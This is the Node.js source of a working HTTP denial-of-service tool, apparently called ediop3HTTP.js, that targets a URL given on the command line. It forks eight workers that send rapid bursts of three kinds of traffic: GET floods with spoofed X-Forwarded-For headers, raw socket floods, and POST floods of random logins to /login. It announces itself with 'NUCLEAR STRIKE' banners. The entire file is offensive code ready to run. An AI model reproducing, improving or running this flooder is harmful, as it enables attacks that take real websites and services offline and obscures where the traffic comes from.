const http = require('http');
const https = require('https');
const url = require('url');
const cluster = require('cluster');
const os = require('os');
const net = require('net');

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1'
];

const TARGET = process.argv[2];
if (!TARGET) {
    console.error('Usage: node ediop3HTTP.js <target_url>');
    process.exit(1);
}

const PARSED_URL = url.parse(TARGET);
const PATHS = ['/','/api','/login','/wp-admin','/graphql','/wp-login.php','/admin','/register'];
const WORKERS = 8; 
const REQUESTS_PER_BURST = 1500;
const BURST_DELAY = 0;

const isHttps = TARGET.startsWith('https://');
const protocol = isHttps ? https : http;

const attackVectors = {
    httpFlood: (agent) => {
        const req = protocol.request({
            hostname: PARSED_URL.hostname,
            port: PARSED_URL.port || (isHttps ? 443 : 80),
            path: PATHS[Math.floor(Math.random() * PATHS.length)],
            method: 'GET',
            agent: agent,
            headers: {
                'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'X-Forwarded-For': `${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}`
            },
            timeout: 5000
        });
        req.on('error', () => {});
        req.end();
    },

    socketFlood: () => {
        const socket = net.connect(PARSED_URL.port || (isHttps ? 443 : 80), PARSED_URL.hostname);
        socket.setNoDelay(true);
        
        socket.on('connect', () => {
            socket.write(`GET ${PATHS[Math.floor(Math.random() * PATHS.length)]} HTTP/1.1\r\n`);
            socket.write(`Host: ${PARSED_URL.hostname}\r\n`);
            socket.write(`User-Agent: ${USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]}\r\n`);
            socket.write(`Accept: */*\r\n\r\n`);
        });
        
        socket.on('error', () => socket.destroy());
        socket.setTimeout(3000, () => socket.destroy());
    },

    postFlood: () => {
        const postData = `username=${Math.random().toString(36)}&password=${Math.random().toString(36)}`;
        const req = protocol.request({
            hostname: PARSED_URL.hostname,
            port: PARSED_URL.port || (isHttps ? 443 : 80),
            path: '/login',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'Connection': 'close'
            },
            timeout: 3000
        });
        req.on('error', () => {});
        req.write(postData);
        req.end();
    }
};

if (cluster.isPrimary) {
    console.log(`[NUCLEAR] Target: ${TARGET}`);
    console.log(`[NUCLEAR] Workers: ${WORKERS}`);
    console.log(`[NUCLEAR] Fire Rate: ${WORKERS*REQUESTS_PER_BURST}req/instant`);
    console.log('==================== LAUNCHING NUCLEAR STRIKE ====================');

    for (let i = 0; i < WORKERS; i++) {
        cluster.fork();
    }

    process.on('SIGINT', () => {
        console.log('\n[NUCLEAR] Stopping attack...');
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit();
    });
} else {
    const agent = new protocol.Agent({
        keepAlive: true,
        maxSockets: 150,
        timeout: 10000
    });

    let totalFired = 0;
    let lastPrint = Date.now();
    
    const attack = () => {
        for (let i = 0; i < REQUESTS_PER_BURST; i++) {
            setImmediate(() => {
                const method = Math.random();
                if (method < 0.5) {
                    attackVectors.httpFlood(agent);
                } else if (method < 0.8) {
                    attackVectors.socketFlood();
                } else {
                    attackVectors.postFlood();
                }
                totalFired++;
                
                if (totalFired % 100 === 0) {
                    const now = Date.now();
                    const rps = Math.round(100000/(now - lastPrint));
                    process.stdout.write(`\r[${process.pid}] FIRED: ${totalFired} (${rps} req/sec)`);
                    lastPrint = now;
                }
            });
        }
        
        if (BURST_DELAY > 0) {
            setTimeout(attack, BURST_DELAY);
        } else {
            setImmediate(attack);
        }
    };

    attack();
}
